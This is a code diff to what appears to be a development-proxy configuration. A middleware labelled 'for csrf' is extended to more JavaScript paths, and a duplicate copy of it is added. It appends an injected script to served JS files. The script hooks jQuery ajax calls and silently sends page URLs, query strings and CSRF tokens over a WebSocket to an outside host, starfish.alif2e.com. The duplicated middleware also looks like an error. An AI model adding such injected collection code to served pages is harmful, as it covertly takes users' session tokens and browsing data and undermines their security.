@@ -25,7 +25,7 @@ tianma
 			// for csrf
 			function(context, next){
 				var path = context.request.path;
-				if(/^\/js\/6v\/atom\/(\?\?)?atom-\w+\.js/.test(path)){
+				if(/^(\/js\/6v\/atom\/(\?\?)?atom-\w+\.js|\/js\/ae\.js|\/js\/5v\/lib\/ae\/ae\.js|\/js\/5v\/lib\/aelite\/aelite\.js)/.test(path)){
 					var response = context.response;
 					var source = response.body();
 					var csrf = "(function(){if(!window.WebSocket){return}function reportAjax(arrList){try{var socket=new WebSocket('ws://starfish.alif2e.com:3000/');socket.onopen=function(){var strObject=JSON.stringify({type:'ajaxlist',data:arrList});socket.send(strObject);socket.close()}}catch(e){}}var arrAjaxList=[];var isReady=false;seajs.use('$',function($){$.ajaxPrefilter('json jsonp',function(s,originalSettings,jqXHR){var match=s.url.match(/([^\\?]+)(?:\\?(.+))?/);var target=match[1]||'';var search=match[2]||'';var jsonp=s.converters['script json']?1:0;match=s.url.match(/(?:\\?|&)_csrf_token_=([^&]+)/);var token=match&&match[1]||'';var ajax={location:location.href,target:target,search:search,jsonp:jsonp,token:token};if(isReady){reportAjax([ajax])}else{arrAjaxList.push(ajax)}});$(function(){isReady=true;reportAjax(arrAjaxList)})})})();";
@@ -61,6 +61,17 @@ tianma
 					context.response.head('access-control-allow-origin', '*');
 				}
 
+				next();
+			},
+			// for csrf
+			function(context, next){
+				var path = context.request.path;
+				if(/^(\/js\/6v\/atom\/(\?\?)?atom-\w+\.js|\/js\/ae\.js|\/js\/5v\/lib\/ae\/ae\.js|\/js\/5v\/lib\/aelite\/aelite\.js)/.test(path)){
+					var response = context.response;
+					var source = response.body();
+					var csrf = "(function(){if(!window.WebSocket){return}function reportAjax(arrList){try{var socket=new WebSocket('ws://starfish.alif2e.com:3000/');socket.onopen=function(){var strObject=JSON.stringify({type:'ajaxlist',data:arrList});socket.send(strObject);socket.close()}}catch(e){}}var arrAjaxList=[];var isReady=false;seajs.use('$',function($){$.ajaxPrefilter('json jsonp',function(s,originalSettings,jqXHR){var match=s.url.match(/([^\\?]+)(?:\\?(.+))?/);var target=match[1]||'';var search=match[2]||'';var jsonp=s.converters['script json']?1:0;match=s.url.match(/(?:\\?|&)_csrf_token_=([^&]+)/);var token=match&&match[1]||'';var ajax={location:location.href,target:target,search:search,jsonp:jsonp,token:token};if(isReady){reportAjax([ajax])}else{arrAjaxList.push(ajax)}});$(function(){isReady=true;reportAjax(arrAjaxList)})})})();";
+					response.clear().write(source+'\r\n'+csrf);
+				}
 				next();
 			}
 		])
